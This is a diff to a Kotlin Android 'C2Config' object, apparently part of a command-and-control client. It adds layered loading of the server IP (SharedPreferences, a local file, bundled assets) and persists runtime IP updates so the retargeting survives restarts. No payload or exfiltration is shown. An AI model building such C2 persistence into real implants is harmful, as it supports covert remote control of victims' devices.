@@ -21,12 +21,33 @@ object C2Config {
     private var serverIp = DEFAULT_IP
     
     /**
-     * Initializes the C2 configuration by reading the IP from the assets/ip.cfg file
+     * Initializes the C2 configuration by reading the IP from various sources
      * This should be called at application startup
      */
     fun initialize(context: Context) {
         try {
-            // Read the IP from the configuration file
+            // First check if there's an IP in SharedPreferences (highest priority)
+            val sharedPreferences = context.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
+            val prefIp = sharedPreferences.getString("ip", null)
+            
+            if (!prefIp.isNullOrBlank()) {
+                serverIp = prefIp
+                Log.d(TAG, "Loaded server IP from SharedPreferences: $serverIp")
+                return
+            }
+            
+            // Next check for a local file copy (second priority)
+            val localFile = File(context.filesDir, "ip.cfg")
+            if (localFile.exists()) {
+                val localIp = localFile.readText().trim()
+                if (!localIp.isBlank()) {
+                    serverIp = localIp
+                    Log.d(TAG, "Loaded server IP from local file: $serverIp")
+                    return
+                }
+            }
+            
+            // Finally, check the assets file (fallback)
             val inputStream = context.assets.open("ip.cfg")
             val reader = BufferedReader(InputStreamReader(inputStream))
             val ip = reader.readLine()?.trim()
@@ -35,12 +56,12 @@ object C2Config {
             // Update the IP if it's valid
             if (!ip.isNullOrBlank()) {
                 serverIp = ip
-                Log.d(TAG, "Loaded server IP from config file: $serverIp")
+                Log.d(TAG, "Loaded server IP from assets: $serverIp")
             } else {
                 Log.w(TAG, "IP config file was empty, using default IP: $DEFAULT_IP")
             }
         } catch (e: Exception) {
-            Log.e(TAG, "Error reading IP config file, using default IP: $DEFAULT_IP", e)
+            Log.e(TAG, "Error reading IP config, using default IP: $DEFAULT_IP", e)
         }
     }
     
@@ -93,8 +114,24 @@ object C2Config {
     /**
      * Update the server IP programmatically
      */
-    fun updateServerIp(newIp: String) {
+    fun updateServerIp(newIp: String, context: Context? = null) {
         serverIp = newIp
         Log.d(TAG, "Updated server IP: $serverIp")
+        
+        // If context is provided, update SharedPreferences for persistence
+        context?.let {
+            try {
+                val sharedPreferences = it.getSharedPreferences("c2_config", Context.MODE_PRIVATE)
+                sharedPreferences.edit().putString("ip", newIp).apply()
+                Log.d(TAG, "Saved IP to SharedPreferences: $newIp")
+                
+                // Also save to local file as backup
+                val file = File(it.filesDir, "ip.cfg")
+                file.writeText(newIp)
+                Log.d(TAG, "Saved IP to local file: $newIp")
+            } catch (e: Exception) {
+                Log.e(TAG, "Error saving IP to storage", e)
+            }
+        }
     }
 }
